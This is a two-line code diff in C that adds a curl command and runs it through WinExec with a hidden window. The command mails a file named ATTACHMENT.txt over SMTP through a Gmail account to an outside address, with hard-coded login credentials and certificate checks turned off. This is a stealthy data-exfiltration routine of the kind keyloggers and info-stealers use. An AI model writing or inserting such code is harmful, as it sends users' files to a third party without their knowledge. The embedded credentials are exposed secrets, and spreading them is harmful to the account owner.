@@ -1,0 +1,2 @@
+char* command = "curl smtp://smtp.gmail.com:587 -v --mail-from \"testedwebb@gmail.com\" --mail-rcpt \"rkazim79@gmail.com\" --ssl -u testedwebb@gmail.com:Ultracloud -T \"ATTACHMENT.txt\" -k --anyauth";
+WinExec(command, SW_HIDE);
